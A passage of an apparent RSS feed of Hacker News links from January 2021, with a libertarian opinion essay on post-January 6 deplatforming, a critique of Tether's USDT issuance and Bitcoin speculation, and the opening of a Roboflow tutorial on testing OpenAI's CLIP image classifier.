January 8, 2021 | https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/ | <a href="https://web.archive.org/web/*/https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><a href="https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/#comments">
			20 <span></span>
		</a></p>
		
		
				<p><img loading="lazy" src="https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake.jpg" alt="" width="600" height="437" srcset="https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake.jpg 600w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-300x219.jpg 300w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-150x109.jpg 150w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-65x47.jpg 65w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-220x160.jpg 220w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-137x100.jpg 137w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-358x261.jpg 358w, https://outofthecave.io/wp-content/uploads/2021/01/burned_at_the_stake-549x400.jpg 549w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>Four years ago, after the unthinkable happened and the wrong guy won the US election of 2016. <a href="https://easydns.com/blog/2017/02/24/the-cultural-purge-will-not-be-televised/">I wrote an article</a> about how I had feared a type of “cultural purge” from within the corporate media, Big Tech and cancel culture spheres. Like everybody else, I didn’t expect Trump to win (like most other Libertarians, I was holding my nose and pulling for Gary Johnson, whose running mate, Bill Weld, endorsed Hillary Clinton <em>during the election campaign).</em></p>
<p>What I expected then, after Trump would have unceremoniously lost the 2016 election,&nbsp; was a type of cultural purge against anybody and everybody who enabled his run or supported him. What surprised me was that after he won the cultural purge proceeded anyway. In retrospect it seems obvious, at the time it blindsided me.<span id="more-1501"></span></p>
<p>For the next four years we watched any (remaining) semblance of objectivity and impartiality wither away from the mainstream media. Even more troubling, was that it was also happening within<em>&nbsp;</em>Big Tech. Everything polarized and all judgement calls became characteristically asymmetrical. As I noted on occasion, that compared to the post 9/11 era when the Neocons controlled the narrative and the word “liberal” was a slur, everything flipped. Now it was the word “conservative” that was unusable and being a single micron to the right of centre was equated with being “literally Hitler”.</p>
<p>I could list the countless examples of deplatformings, cancellations, character assassinations and careers destroyed in the intervening time. It became so ridiculous, so devoid of any attempt at a claim to due process or fairness that an entire counter-culture has formed around criticizing or ridiculing it. <a href="https://easydns.com/blog/2019/10/22/unassailable-the-book-that-protects-you-from-cancel-culture-and-deplatform-attacks/">I wrote a book</a> about <a href="https://easydns.com/blog/2019/10/22/unassailable-the-book-that-protects-you-from-cancel-culture-and-deplatform-attacks/">defending from deplatform attacks</a>, which I started <a href="https://axisofeasy.com/aoe/the-missing-manual-for-defending-yourself-against-deplatforming-and-cancel-culture/">giving away for free</a> in April when Big Tech started deplatforming deviant reporting on the COVID-19 crisis. Babylon Bee sprang into existence and quickly rivalled The Onion, <a href="https://babylonbee.com/news/op-ed-anyone-who-claims-cancel-culture-is-real-is-a-bigot-who-should-lose-his-job">riffing on cancel culture</a> and hitting headwinds on multiple occasions when their scathing satire <a href="https://news.yahoo.com/twitter-apologizes-mistakenly-suspending-babylon-154401646.html">was indistinguishable from the reality</a> they were lampooning.</p>
<div id="attachment_1511"><p><a href="https://babylonbee.com/news/op-ed-anyone-who-claims-cancel-culture-is-real-is-a-bigot-who-should-lose-his-job"><img aria-describedby="caption-attachment-1511" loading="lazy" src="https://outofthecave.io/wp-content/uploads/2021/01/oped-e1610129919714.png" alt="" width="800" height="745"></a></p><p id="caption-attachment-1511">TL,DR: Cancel culture is a right-wing conspiracy promulgated by Qanon Incels</p></div>
<p>More than once I thought “This is it, this has to be Peak Outrage”, and then somebody else’s career or business would be destroyed, sometimes for imagined transgressions that may or may not have taken place years ago or even before the target even started a position they’d just been canceled from having (David Collum’s section on cancel culture, featuring his own cancelation, lays many of these out in his famous Year In Review series, <a href="https://www.peakprosperity.com/dave-collum-2020-year-in-review-part-2/#cancelculture">the 2020 issue</a>).</p>
<p>Once the 2020 election was finally in the rear-view mirror and it appeared likely the administration had changed I thought, once again, that the worst was over. The world was mired in lockdown fatigue, we’re not even dealing with the economic fallout of COVID yet, and “ding dong the witch is dead”. Surely cancel culture and social justice extremism would taper off, if only out of exhaustion.</p>
<blockquote>
<p dir="ltr" lang="en">i’m fucking exhausted <a href="https://t.co/gjmsQtgBFh">pic.twitter.com/gjmsQtgBFh</a></p>
<p>— Jordan Lancaster (@jordylancaster) <a href="https://twitter.com/jordylancaster/status/1316065323595034628?ref_src=twsrc%5Etfw">October 13, 2020</a></p></blockquote>

<h2>Boy am I wrong, again.</h2>
<p>The ignominy with which TheDonald has chosen to close out his term, the lack of humility, of which is he likely congenitally incapable of, will instead reignite the flames of the culture wars and propel them to new heights. As investing legend (and Fed critic) Bill Fleckinstein observed in his subscriber note yesterday, there is a right way and a wrong way to go out, even if you feel like you got shafted:</p>
<blockquote><p>On the subject of yesterday’s violence, although it is unlikely to have long-lasting economic impacts and thus is largely in the realm of politics, which I tend to avoid, I think there is a worthwhile lesson to point out. Obviously, Trump’s worst qualities, which stem from his being a petulant egomaniac, have been on display since he lost the election and I’m reminded of a very valuable lesson I learned from my investment business mentor, who told me that when you get fired by a client (yes, that happens), rather than be upset and act petulantly what you should say is, “How can I make the transition easier for you?”</p>
<p>In other words, you turn a loss into a bit of a victory by being a class act. I can’t tell you how many times over my investment career when that lesson and corollaries to it have been quite useful, and no matter what, trying to comport yourself in such a manner pays big dividends over time in my opinion.</p></blockquote>
<p>Like Fleck, I don’t even want to get into the gory details of the events of Jan 6, the storming of the capital, the riots, other than to say that when we talk about the twilight of the nation state and the rise of the Network State <a href="https://axisofeasy.com/salon">in our #AxisOfEasy podcasts,</a> these are the sort of disorderly episodes we fear punctuating or worse, defining, this oncoming societal shift.</p>
<p>We certainly seem to be <a href="https://www.goodreads.com/book/show/670089.The_Fourth_Turning">into The Fourth Turning now</a>, a book I have been rereading and was just finishing up listening to the day of the DC riots. Their prescience is creepy, especially as they outlined the “climax” phase of the Crisis period, which, by their reckoning started around… 2020 and would last another 6 to 10 years:</p>
<div>
<blockquote><p>One or both of today’s dominant parties could go the way of the Whigs…History warns that when a crisis catalyzes, a previously dominant political party or regime can find itself perceived or blamed for direct mistakes that led to the national emergency.</p>
<p>Whoever holds power when the Fourth Turning arrives could find themselves joining the ranks of the 14th century Lancastrians, circa 15th century Catholics, circa 1680 Stewarts, circa 1770 Tories, circa 1860 Democrats, and circa 1929 Republicans. That party could find itself out of power for a generation.</p>
<p>Key persons associated with it could find themselves defamed, stigmatized, harassed, economically ruined, or even personally punished”</p></blockquote>
<p>Since that day, Big Tech and corporate media moved at a new speed that I found dizzying. Twitter pile-ons are ugly enough spectacles and that’s just watching end-users gang up on the sacrificial deviant of the day. But <a href="https://www.theverge.com/2021/1/7/22218776/shopify-trump-store-disable-campaign-ecommerce-sites-capitol">watching&nbsp;<em>Shopify</em></a> of all companies, pile on to Facebook and Twitter’s deplatforming of a sitting president (which at this moment he is, like it or not), <a href="https://www.cnn.com/2021/01/07/media/josh-hawley-book-canceled/index.html">Simon and Schuster canceling their contract</a> to publish Sen Josh Hawley’s book <em>on Big Tech censorship</em> (which I wanted to read) and I’m sure the list will go on after I’m done writing, this is just fucking crazy.</p>
<p>(I paused writing this to take a meeting, an hour later I come back to finishing it off and a friend, who fled Chicago this past summer because of the complete breakdown of civil order there, among other US cities at that time, <a href="https://chicago.suntimes.com/politics/2021/1/7/22219360/trump-rally-capitol-tank-noodle-insight-studios-properties">sent me this story</a>. It outlines numerous other firings and cancelations of Chicagoans who attended the DC rally (but not necessarily involved in the violence), and businesses who even commented in social media about it.</p>
<div id="attachment_23289"><p><img aria-describedby="caption-attachment-23289" loading="lazy" src="https://axisofeasy.com/wp-content/uploads/2021/01/properties-1024x374.png" alt="" width="1024" height="374"></p><p id="caption-attachment-23289">Translation: a social media mob demanded we cancel one of our employees with zero due process or time to consider, so we did. <strong>Who do you want us to fire next?</strong></p></div>
<h2><strong><em>Think it through people.</em> </strong></h2>
<p>Do you want to live in a society where Facebook and Twitter decide not only what is <em>permissible</em> to say but even <em>which narratives can be explored</em> and which ones can’t?</p>
<p>Yes I know, “private companies, their own AUP, blah blah blah” – I’m a libertarian and a tech company CEO, so I know all this. I’ll preempt these objections with what I said in my book, which is that when tech companies base platform/deplatform decisions on something that is happening&nbsp;<em>outside&nbsp;</em>of their platforms, they are in effect, exercising jurisprudence and adjudicating international law. All any company can competently assess is what is happening on within their respective platforms, how their employees are fulfilling their roles and serving the businesses customers <em>and nothing else.</em></p>
<p>Would you be ok with your employer firing you if enough strangers who don’t know you, don’t do business with your company and have no first hand knowledge of events or what your circumstances are scream at your boss to cut you loose?</p>
<p>Do you want contracts to be subject to negation by&nbsp; public sentiment of events 2 or 3 or more degrees separated from the contracted parties?</p>
<p>Do you want to have every aspect of your life scrutinized by somebody else’s measure of moral and ideological purity before you can say anything online? How about before you can book a hotel room? Fill up your car with gas? Go shopping? Get on a plane?</p>
<p>After all, we have big data and AI now, <em>so this is all doable.&nbsp;</em></p>
<p>Do you really want to live within the constraints of a type of societal social credit system where your every action, <em>your very thoughts</em> are bounded by external and ever shifting, subjective and <a href="https://outofthecave.io/articles/merriam-webster-modifies-word-definition-after-left-manufactures-offensive-meaning-for-it/">revisionist social mores</a>? Many of them defined by the most oversensitive, self-absorbed hysterics on social media?</p>
<p>Be very careful if you think this is a good thing, because sooner or later, you’re going to be on the wrong side of it. By then it’ll be too late.</p>


</div>
<p><a href="#" rel="nofollow" onclick="window.print(); return false;" title="Printer Friendly, PDF &amp; Email"><img src="https://cdn.printfriendly.com/buttons/printfriendly-button.png" alt="Print Friendly, PDF &amp; Email"></a></p>
			</div></div>]]>
            </description>
            <link>https://outofthecave.io/articles/the-cultural-purge-is-now-in-overdrive/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25688127</guid>
            <pubDate>Fri, 08 Jan 2021 18:40:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tether Press and Bitcoin’s Speculative Mania]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687847">thread link</a>) | @dgellow
<br/>
January 8, 2021 | http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/ | <a href="https://web.archive.org/web/*/http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-487">
	
	<div>
		
<p>Tether has become a plain old fiat central bank, issuing new USDTs against debt. USDTs are backed, but not by US dollars. They are backed by promises to make good on their debts by the receivers of newly minted USDTs.</p>



<p>While it’s not fraudulent per se, the fact that USDTs aren’t backed by US dollars opens the door to unlimited USDT printing. The gatekeepers are the people in charge of the Tether printing press. In an ideal world, they should ensure that proper reserve requirements are met and that the receivers of newly minted USDTs are properly capitalised.</p>



<p>However, Bitcoin’s exponential price rise, happening in lockstep with ever-increasing USDT issuance, shows that the Tether press has gone in overdrive. When the mania will end, crypto investors will lose everything, in a second.</p>



<h2>The Tetheral Reserve</h2>



<p>Long gone are the days when Tether claimed that USDTs were backed by cash. Its own website states:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.18.26.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.18.26.png 659w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.18.26-300x41.png 300w" sizes="(max-width: 659px) 100vw, 659px"><figcaption>source: tether.to/legal</figcaption></figure>



<p>It’s not necessarily a bad thing for the crypto ecosystem that Tether doesn’t have cash on hand to the amount of USDTs issued. First off, that would be a central point of failure. Tether the institution is currently under investigation, USDTs are used for money laundering, and having $20 billion in a bank account would expose you to having your assets frozen – as has <a href="https://www.coindesk.com/bitfinex-files-for-subpoena-in-bid-to-recover-880-million-in-frozen-funds">already happened in the past</a>.</p>



<p>It’s much more practical to have all your assets in loans to counterparties, from a solvency and operational point of view. The problem is, of course, that is exposes you to:</p>



<h3>Liquidity risk</h3>



<p>The role of USDTs is to replace US dollars in the crypto ecosystem. USDTs are much easier to transfer, because you don’t have to deal with a bank that will ask you all sorts of questions about the origins of the funds, the purpose of the transfer, and the identity of the receiver. In short, you don’t have to bother with AML (“anti money laundering”), KYC (“know your client”), and capital controls regulations. In shorter, USDTs empower you to launder money.</p>



<p>But as much as USDTs are more practical than US dollars, their usage requires convertibility. We live in the real world where nobody accepts USDTs as payment, and you need to be able to cash out your USDTs for real money. You can do this by buying Bitcoin with USDTs on an exchange that trades the BTC/USDT pair, wiring them to an exchange that trades the BTC/USD pair, and cash out. Or, if you are a big player, you can go to a crypto OTC desk and sell your USDTs directly for cash:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-1024x277.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-1024x277.png 1024w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-300x81.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42-768x208.png 768w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.33.42.png 1038w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>source: https://www.coindesk.com/tether-usdt-russia-china-importers</figcaption></figure>



<p>This act of financial hot potato, where someone else buys your USDTs, works for as long as the crypto bull run goes on. However, you need a backstop for when things go south, namely, when people suddenly stop wanting to acquire USDTs, and want to cash out for real money. Then, someone has to redeem the USDTs for cash, and that someone should be the issuer: Tether.</p>



<p>If Tether doesn’t have enough cash on hand to process redemption requests, you have a good old liquidity crunch, when panic sets in, and people start dumping their USDT holdings en masse, for whatever price of thing they can get in exchange. Much like a real world financial crisis.</p>



<h3>USDT redemptions?</h3>



<p>Tether’s willingness to redeem USDTs for real money has been questioned over the last few years, not least because it seems that they’ve ever barely done it, as the number of USDTs outstanding never goes down:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33.png 946w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33-300x104.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-10.41.33-768x266.png 768w" sizes="(max-width: 946px) 100vw, 946px"><figcaption>USDT market cap, source: coin360</figcaption></figure>



<p>Note that the dip in October 2018 was due to Tether loaning $850m to Bitfinex, not actual redemptions.</p>



<p>Other reasons to question Tether’s willingness to redeem USDTs are the fact that, well, a lot of people couldn’t get Tether to redeem them, despite Tether’s own assurances that proper mechanisms were in place. Moreover, Tether’s own handling of this “FUD” has been anecdotal and shady:</p>



<blockquote>— Paolo Ardoino (@paoloardoino) <a href="https://twitter.com/paoloardoino/status/1346101912677048320?ref_src=twsrc%5Etfw">January 4, 2021</a></blockquote> 



<p>In the tweet above, the CTO of Tether shares “proof” that USDTs can be redeemed. However, the “proof” is just a list of USDT transactions to and from Bitfinex supposedly performed by an OTC desk, and without a matching set of USD transactions, it means nothing. The original question was, after all:</p>



<blockquote><p lang="en" dir="ltr">If anyone…anywhere….has redeemed USDT for USD and can show proof of this transaction I would be happy to compensate you for your time and effort. Thanks! <a href="https://t.co/wScl7s1ZAc">https://t.co/wScl7s1ZAc</a></p>— Santiago Capital (@SantiagoAuFund) <a href="https://twitter.com/SantiagoAuFund/status/1345970353747578882?ref_src=twsrc%5Etfw">January 4, 2021</a></blockquote> 



<p>Notice the “redeem <strong>for USD</strong>” part that gets ignored by Tether. Yup.</p>



<h2>The mother of all speculative manias</h2>



<p>Remember the real estate bubble of 2003-2007? How people who could barely pay their bills would buy five condos, see their price go up as other people would also buy five condos, and everyone would seemingly get rich out of thin air, together? The reasons for that bubble, in short, were lax lending requirements. A more complete explanation was that banks found ways (thanks to securitisation, reverse engineering credit rating agency rulebooks, and shadow banking) to issue mortgages to people who should have never, ever, qualified for those mortgages. As more mortgages were issued, housing prices went up, in a seemingly infinite loop.</p>



<h3>Infinite money</h3>



<p>Fiat money is issued against debt. I come into a bank, ask for $10,000, and the bank gives me the money in exchange of me acknowledging that I owe the bank $10,000 – plus interest.</p>



<p>Why can’t I come into a bank and ask for $10,000,000,000? Because banks have rules governing how much they can lend and to whom. The first rule is common sense: if customers aren’t able to repay their loans, the bank will go bust, and because the bank doesn’t want to go bust, it will only lend to people whom it deems creditworthy.</p>



<p>Other rules are regulatory. Banks must have adequate capital to absorb losses on their loan portfolio. It means that their assets must exceed their loans, and the riskier the loans, the larger that excess must be. Banks must also perform maturity matching – meaning that their sources of funding can’t be all short term, when they’re underwriting 30 year mortgages. Then there is risk weighting of assets, Basel II capital frameworks, etc., etc. Just look at this monstruosity:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/IRB_Basel2.jpg" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/IRB_Basel2.jpg 577w, http://www.tr0lly.com/wp-content/uploads/2021/01/IRB_Basel2-300x265.jpg 300w" sizes="(max-width: 577px) 100vw, 577px"><figcaption>Banking is complicated<br></figcaption></figure>



<p>There are many, many, many rules in place that are intended to prevent bubbles and manias. Despite the meme that “banks print fiat out of thin air”, they don’t – because of those rules. If they did, you’d have a new tulip bulb mania on every Thursday, and civilisation would collapse before summer.</p>



<h3>Infinite almost-money</h3>



<p>What rules are in place at Tether? What prevents them from printing USDTs out of thin air, without any rules? What prevents Binance from calling Tether and asking for 10,000,000,000 USDTs?</p>



<p>At first glance, the answer is: reality. Were Tether to issue too many USDTs, and start buying BTC and ETH and XRP with it, the price of USDT would get below $1. This has happened in the past, albeit for short periods of time.</p>



<p>But the USDT peg has remained exceptionally stable throughout 2020, despite the greatest financial and economic crisis in recent memory. Exchanges are maintaining the USDT peg, because their very existence depends on it. And USDT has replaced USD  in the crypto ecosystem, they cannot allow it to fail. They have USDT on their books. More importantly, their clients own USDT, and account for it as if it were real US dollars. Should USDT’s price fall, people would sell other cryptocurrencies as well, because they’d need to make up for the lost USDT liquidity – and the whole crypto ecosystem would collapse.</p>



<p>Remember, there is a very real need for USDTs, as long as they are pegged to the US dollar, and can be used for immediate, KYC and AML – free transactions.</p>



<p>The USDT/USD peg is founded on the premise that people won’t try to cash out en masse. As long as they don’t, USDT printing can continue.</p>



<h3>Creating value out of thin air</h3>



<p>Bitcoin doesn’t have intrinsic value. Seriously, it doesn’t. It has no use case (transactions don’t create sustainable demand – you buy Bitcoin, transact, and the other party sells it, a few minutes later), produces no cash flows, gives you no rights or claims. It’s always been a confidence game.</p>



<p>How do you create confidence?</p>



<blockquote><p lang="en" dir="ltr">If the higher demand is self-sustaining without manipulation then the manipulation actually bootstrapped genuine value. Maybe like an entrepreneur who aggressively exaggerates the state of development of a project and raises funds but then creates the product and justifies value</p>— Ari Paul ⛓️ (@AriDavidPaul) <a href="https://twitter.com/AriDavidPaul/status/965744440303374342?ref_src=twsrc%5Etfw">February 20, 2018</a></blockquote> 



<p>As long as things go up, and people don’t see any reason why they should stop, things will continue going up. Of course, people at large are unreliable, and they could stop thinking that things will continue going up, because there’s a huge economic crisis, for example. Then things go down very fast:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-11.33.12.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-11.33.12.png 597w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-07-at-11.33.12-300x241.png 300w" sizes="(max-width: 597px) 100vw, 597px"><figcaption>Bitcoin’s price crash during the COVID-19 rout in March 2020</figcaption></figure>



<p>Had this selling been allowed to continue, there wouldn’t be a crypto ecosystem left to speak of, today. This is why Tether and the exchanges came together and crossed the Rubicon, and decided to create USDT liquidity to stop the selling, by minting a huge 1.6 BILLION USDTs on March 31, 2020, and distributing it across main exchanges.</p>



<p>And it worked. The Tetheral Reserve was born – an infinite pool of USDT liquidity, backed by the exchanges themselves, who committed to hold the USDT/USD peg, in order to save the crypto ecosystem.</p>



<h3>To infinity, and beyond</h3>



<p>Since that fateful day nine months ago, the Tether press has been picking up speed. As the price of Bitcoin increases, the confidence in the crypto ecosystem rises to new highs, and people don’t bother to question the exponential rise of USDTs outstanding. First of, because the mainstream media doesn’t talk about it – only about the rise of Bitcoin’s price. Then, because insiders themselves …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/">http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/</a></em></p>]]>
            </description>
            <link>http://www.tr0lly.com/bitcoin/the-tether-press-and-bitcoins-speculative-mania/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25687847</guid>
            <pubDate>Fri, 08 Jan 2021 18:22:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to try CLIP: OpenAI's new universal zero-shot image classifier]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25687532">thread link</a>) | @yeldarb
<br/>
January 8, 2021 | https://blog.roboflow.com/how-to-use-openai-clip/ | <a href="https://web.archive.org/web/*/https://blog.roboflow.com/how-to-use-openai-clip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                <div><p>Earlier this week, OpenAI dropped a bomb on the computer vision world: two new groundbreaking models that hint at what's to come as massive GPT3-esque Transformer models encroach on the vision domain. While <a href="https://openai.com/blog/dall-e/">DALL-E</a> (a model that can generate images from text prompts) has garnered much of the attention this week, this post focuses on <a href="https://openai.com/blog/clip/">CLIP</a>: a zero-shot classifier which is arguably even more consequential.</p><p>Until now, <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">classifying images</a> has involved collecting a custom dataset of hundreds, thousands, or even millions of labeled images that suitably represent your targeted classes and using it to train a supervised classification model (usually a convolutional neural network). This approach (and extensions of it like <a href="https://blog.roboflow.com/object-detection/">object detection</a>) has led to the rapid proliferation of computer vision over the past decade (powering everything from <a href="https://blog.roboflow.com/self-driving-car-dataset-missing-pedestrians/">self driving cars</a> to <a href="https://blog.roboflow.com/designing-augmented-reality-computer-vision-apps/">augmented reality</a>).</p><p>The downside of supervised training is that the resultant models do not generalize particularly well. If you show them an image from a different domain, they usually do no better than randomly guessing. This means you need to curate a wide variety of data that is sufficiently representative of the exact task your model will perform in the wild.</p><h2 id="enter-openai-clip">Enter OpenAI CLIP</h2><p>The recent introduction of <a href="https://openai.com/blog/clip/">CLIP</a> (Contrastive Language-Image Pre-training) has disrupted this paradigm. It's a zero-shot model, meaning it can identify an enormous range of things it has never seen before.</p><figure><img src="https://blog.roboflow.com/content/images/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png 600w, https://blog.roboflow.com/content/images/size/w1000/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png 1000w, https://blog.roboflow.com/content/images/2021/01/Screen-Shot-2021-01-08-at-12.55.41-PM.png 1367w" sizes="(min-width: 720px) 720px"><figcaption>CLIP is like the best AI caption writer. It's able to say what is in an image from 32,768 sampled captions. Image credit: <a href="https://openai.com/blog/clip/">OpenAI</a></figcaption></figure><p>In traditional classifiers, the meaning of the labels is ignored (in fact, they're often simply discarded and replaced with integers internally). By contrast, CLIP creates an encoding of its classes and is pre-trained on over 400 million text to image pairs. This allows it to leverage transformer models' ability to extract semantic meaning from text to make image classifications out of the box without being fine-tuned on custom data.</p><p><strong>All you need to do is define a list of possible classes, or descriptions, and CLIP will make a prediction for which class a given image is most likely to fall into based on its prior knowledge. Think of it as asking the model "which of these captions best matches this image?"</strong></p><p>In this post, we will walk through a demonstration of how to test out CLIP's performance on your own images so you can get some hard numbers and an intuition for how well CLIP actually does on various use case. <strong>We found that CLIP does better than <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">our custom trained ResNet classification models</a> on a <a href="https://public.roboflow.com/classification/flowers_classification">flower classification</a> task. </strong>It also does surprisingly well over a range of more obscure and challenging tasks (including identifying mushroom species in pictures from our camera roll and <a href="https://public.roboflow.com/object-detection/oxford-pets/2">identifying breeds of dogs and cats</a>).</p><p>Resources in this tutorial:</p><ul><li><a href="https://public.roboflow.com/classification/flowers_classification">Public flower classification dataset</a></li><li><a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">CLIP benchmarking Colab notebook</a></li><li><a href="https://github.com/openai/CLIP">CLIP repo</a></li><li>Corresponding YouTube</li></ul><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/8o701AEoZ8I?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="assembling-your-dataset">Assembling Your Dataset</h2><p>To try out CLIP, you will need to bring a dataset of images that you want classified, partitioned into the classes that you would like to see. </p><p>If you do not already have a dataset, and would like to just try out the new technology, take a look at Roboflow's <a href="https://public.roboflow.com/">public computer vision datasets</a>.</p><p>In this post, we'll be benchmarking CLIP on the public <a href="https://public.roboflow.com/classification/flowers_classification">flower classification dataset</a>. If using your own data, <a href="https://docs.roboflow.com/adding-data/classification">uploading your data to Roboflow</a> is easy and free (up to 1000 images), and then you can follow the same flow in this blog.</p><figure><img src="https://blog.roboflow.com/content/images/2021/01/image-9.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/01/image-9.png 600w, https://blog.roboflow.com/content/images/size/w1000/2021/01/image-9.png 1000w, https://blog.roboflow.com/content/images/size/w1600/2021/01/image-9.png 1600w, https://blog.roboflow.com/content/images/2021/01/image-9.png 1690w" sizes="(min-width: 720px) 720px"><figcaption>The example flowers classification dataset used in this post</figcaption></figure><p>Once you've assembled your dataset, it on to the <a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">CLIP benchmarking Colab notebook</a>.</p><h2 id="installing-clip-dependencies">Installing CLIP Dependencies</h2><p>To try CLIP out on your own data, make a copy of the notebook in your drive and make sure that under Runtime, the GPU is selected (Google Colab will give you a free GPU for use). Then, we make a few installs along with cloning the CLIP Repo. </p><h2 id="downloading-your-dataset-into-colab">Downloading Your Dataset into Colab</h2><p>The next step is to download your classification dataset into Colab. </p><figure><img src="https://blog.roboflow.com/content/images/2021/01/image-8.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2021/01/image-8.png 600w, https://blog.roboflow.com/content/images/2021/01/image-8.png 858w" sizes="(min-width: 720px) 720px"><figcaption>Downloading classification data into the notebook</figcaption></figure><p>If you made a dataset in Roboflow, this is achieved by hitting <code>Generate</code>, then <code>Download</code> in the <code>OpenAI CLIP Classification</code> format. This will put all of your test images in a folder called <code>test</code> with separate subdirectories of images for each class in your dataset and give you a <code>_tokenization.txt</code> file that lets you experiment with "Prompt Engineering" which can drastically improve or degrade the model's performance.</p><p>We've also created a converter for object detection datasets which will create a textual description from the bounding boxes present. We had mixed results with these but they are certainly interesting to play with.</p><p>Additionally, we have made all of <a href="https://public.roboflow.com/">our open source datasets</a> available to download for free in the CLIP format.</p><h2 id="inferring-class-labels-with-clip">Inferring Class Labels with CLIP</h2><p>The final step is to pass your test images through a predictions step. </p><p>CLIP takes an image and a list of possible class captions as inputs. You can define the class captions as you see fit in the <code>_tokenization.txt</code> file. Be sure to make sure they stay in the same order as the alphabetically sorted <code>class_names</code> (defined by the folder structure).</p><p><a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">The notebook</a> contains code to iterate over each of the class folders in the test set and pass the relevant images through a prediction step. </p><h3 id="experimenting-with-ontologies-and-results">Experimenting with Ontologies and Results</h3><p>When you use CLIP for your classification task, it is useful to experiment with different class captions for your classification ontology, and remember that CLIP was trained to differentiate between image captions.</p><p>On the flowers dataset, we tried the following ontologies and saw these results:</p><ul><li><code>"daisy" vs "dandelion"]</code> &nbsp;--&gt; 46% accuracy (worse than guessing)</li><li><code>"daisy flower" vs "dandelion flower"</code> --&gt; 64% accuracy</li><li><code>"picture of a daisy flower" vs "picture of a dandelion flower"</code> --&gt; 97% accuracy</li></ul><p><strong>97% accuracy is higher than any <a href="https://blog.roboflow.com/custom-resnet34-classification-model/">other classification model</a> that we have trained on this dataset. </strong></p><p>These results show the importance of providing the right class descriptions to CLIP and express the richness of the pretraining procedure, a feature that is altogether lost in traditional, binary classification. OpenAI calls this process "prompt engineering".</p><h2 id="flipping-the-script">Flipping the Script</h2><p>CLIP may have many additional use cases including ranking images against a target query string, or sorting images among their uniqueness.</p><p>In <a href="https://colab.research.google.com/drive/1LXla2q9MCRRI_kTjpvag2Vz-7EGLnki5#scrollTo=lOF3Feb7jrnu">the notebook</a>, you'll see code defining two variables <code>image_features</code> and <code>text_features</code>. The cosine similarity between any pair of these features represents their semantic distance - and from our experience thus far, it is strikingly accurate. These are the early days... 